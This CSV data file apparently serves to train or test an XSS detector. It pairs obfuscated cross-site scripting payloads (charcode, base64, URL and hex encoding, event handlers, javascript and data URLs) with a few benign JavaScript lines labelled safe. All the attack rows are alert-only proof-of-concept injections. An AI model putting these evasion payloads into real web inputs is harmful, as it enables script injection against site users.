"payload","source","is_malicious","notes"
"<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>","JuiceShop","True","Obfuscated case and charcode for search bar"
"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>","PayloadsAllTheThings","True","Base64-encoded alert for search bar"
"<svg/onload=eval(decodeURIComponent('alert%281%29'))>","JuiceShop","True","URL-encoded SVG for profile bio"
"\" onpointerdown=alert`xss`\"","TryHackMe","True","Polyglot with rare event for attribute context"
"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>","PayloadsAllTheThings","True","Base64 data URL for profile bio"
"<input onfocus=eval('alert\\x281\\x29')>","JuiceShop","True","Hex-encoded JS for login form"
"<div onscroll=alert(String.fromCharCode(88,83,83))>","TryHackMe","True","Charcode XSS for search bar"
"<embed src=vbscript:msgbox('xss')>","PayloadsAllTheThings","True","VBScript for legacy browsers"
"<iframe src=javascript:alert(decodeURIComponent('%58%53%53'))>","JuiceShop","True","URL-encoded JS for profile bio"
"<img src=x onmousemove=alert`1`>","TryHackMe","True","Template literal with mousemove for search bar"
"alert('safe')","Safe","False","Safe for testing"
"console.log('x')","Safe","False","Safe console output"
"document.getElementById('test')","Safe","False","Safe DOM access"
"window.location='home'","Safe","False","Safe redirect"
"console.warn('debug')","Safe","False","Safe console output"
"alert('welcome')","Safe","False","Safe alert for UI"
"\\\"><script>alert('test')</script>\\\"","TryHackMe","True","Attribute-based XSS for search bar"
"\\\"><img src='x' onerror=alert('hack')>\\\"","TryHackMe","True","Attribute-based image XSS for search bar"
"<a href=javascript:alert('click')>","TryHackMe","True","Link-based XSS for profile bio"
"<div onmouseover=alert('xss')>","TryHackMe","True","Mouseover XSS for search bar"
